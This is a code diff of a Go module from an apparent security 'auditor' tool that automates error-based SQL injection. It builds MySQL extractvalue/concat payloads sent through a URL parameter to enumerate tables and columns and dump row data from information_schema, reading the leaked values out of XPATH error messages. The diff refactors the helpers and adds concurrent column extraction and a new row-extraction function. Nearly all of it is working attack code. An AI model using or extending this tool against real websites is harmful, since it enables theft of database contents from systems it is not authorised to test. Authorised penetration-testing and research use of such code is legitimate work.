@@ -1,19 +1,19 @@
-package base
+package errorBased
 
 import (
 	"auditor/core/utils"
 	"auditor/entities"
 	"fmt"
 	"log"
-	"regexp"
-	"strconv"
 	"strings"
+	"sync"
 )
 
 const (
 	ErrXPathForm      = "XPATH syntax error: '.*'"
 	ErrXPathQueryFrom = "XPATH syntax error: ':.*'"
 	ScanLength        = true
+	ColonSymbol_16    = "0x3a"
 )
 
 func ErrorBasedvalidate(options *entities.DBOptions, query string) string {
@@ -21,32 +21,6 @@ func ErrorBasedvalidate(options *entities.DBOptions, query string) string {
 	u.RawQuery = fmt.Sprintf("%s=%s", options.Parameter, options.ParameterValue+query)
 
 	return utils.GetPageHTML(u.String(), options.Cookie)
-}
-
-func TrimData(s string) string {
-	s = strings.ReplaceAll(s, "XPATH syntax error: ':", "")
-	s = strings.ReplaceAll(s, "'\nWarning:", "")
-	s = strings.ReplaceAll(s, "'", "")
-	return s
-}
-
-func buildDatabasesPayload(head, tail int) string {
-	payload := `+and+extractvalue(1,concat(':',substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema+=+database()),%d,%d)))`
-	return fmt.Sprintf(payload, head, tail)
-}
-
-func fetchingDataFromHTML(options *entities.DBOptions, payload string) string {
-	html := ErrorBasedvalidate(options, payload)
-	r := regexp.MustCompile(ErrXPathQueryFrom)
-	return TrimData(r.FindString(html))
-}
-
-func fetchingDatabasesLen(options *entities.DBOptions) int {
-	data := fetchingDataFromHTML(options, "+and+extractvalue(1,concat(':',length((select+group_concat(table_name)+from+information_schema.tables+where+table_schema+=+database()))))")
-	dbLength, _ := strconv.Atoi(TrimData(data))
-
-	log.Println("[*] DB length: ", dbLength)
-	return dbLength
 }
 
 func ExtractDBName(options *entities.DBOptions) {
@@ -74,39 +48,66 @@ func ExtractTables(options *entities.DBOptions) {
 	}
 }
 
-func buildColumnsPayload(tbl string, length bool, head, tail int) string {
-	if length {
-		payload := `+and+extractvalue(1,concat(':',length((select+group_concat(column_name)+from+information_schema.columns+where+table_name+=+'%s'))))`
-		return fmt.Sprintf(payload, tbl)
-	}
-	payload := `+and+extractvalue(1,concat(':',substr((select+group_concat(column_name)+from+information_schema.columns+where+table_name+=+'%s'),%d,%d)))`
-	return fmt.Sprintf(payload, tbl, head, tail)
-}
-
-func fetchingColumnsLen(options *entities.DBOptions, table string) int {
-	payload := buildColumnsPayload(table, ScanLength, 0, 0)
-	data := fetchingDataFromHTML(options, payload)
-	length, _ := strconv.Atoi(TrimData(data))
-	return length
-}
-
 func ExtractColumns(options *entities.DBOptions) {
+	wg := sync.WaitGroup{}
+
 	for table := range options.Tables {
 		log.Println("[+] working on table: ", table)
 
 		columnsLen := fetchingColumnsLen(options, table)
 		log.Println("[!] found length: ", columnsLen)
 
-		var head, tail = 1, 31
-		var columns string
-		for columnsLen > 0 {
-			payload := buildColumnsPayload(table, !ScanLength, head, tail)
+		wg.Add(1)
+		go func(table string) {
+			var head, tail = 1, 31
+			var columns string
 
-			columns += fetchingDataFromHTML(options, payload)
-			columnsLen -= head + tail
-			head, tail = (tail + 1), (tail * 2)
-		}
-		log.Println("[!!] found columns: ", columns)
-		options.Tables[table] = strings.Split(columns, ",")
+			for head < columnsLen+32 {
+				payload := buildColumnsPayload(table, !ScanLength, head, tail)
+				columns += fetchingDataFromHTML(options, payload)
+				head, tail = (tail + 1), (tail * 2)
+			}
+
+			log.Println("[!!] found columns: ", columns)
+			options.Tables[table] = strings.Split(columns, ",")
+			wg.Done()
+		}(table)
+		wg.Wait()
 	}
+}
+
+func ExtractRowsByTable(options *entities.DBOptions, table string) {
+	rowsStrLength := fetchingRowsLen(options, table)
+	var head, tail = 1, 31
+	var rows string
+	for head < rowsStrLength+32 {
+		log.Println("[-] current value of rowsStrLength: ", rowsStrLength, head, tail)
+
+		payload := buildRowsPayload(options.PayloadStr, table, !ScanLength, head, tail)
+		log.Println("[!!] payload: ", payload)
+
+		rows += fetchingDataFromHTML(options, payload)
+
+		log.Println("====================")
+		log.Println(fetchingDataFromHTMLWithouTrim(options, payload))
+		log.Println("====================")
+
+		head, tail = (tail + 1), (tail * 2)
+	}
+
+	log.Println("[!!] found rows: ", rows)
+	dataLength := len(strings.Split(rows, ":"))
+	for i := 0; i < dataLength; i += 8 {
+		end := i + 8
+		if end > dataLength {
+			end = dataLength
+		}
+		options.Rows[i] = strings.Split(rows, ":")[i:end]
+	}
+
+	// log.Println()
+	// log.Println(len(strings.Split(rows, ":")), strings.Split(rows, ":"))
+	// log.Println()
+	// options.Rows[len(strings.Split(rows, ":"))] = []string{rows}
+
 }
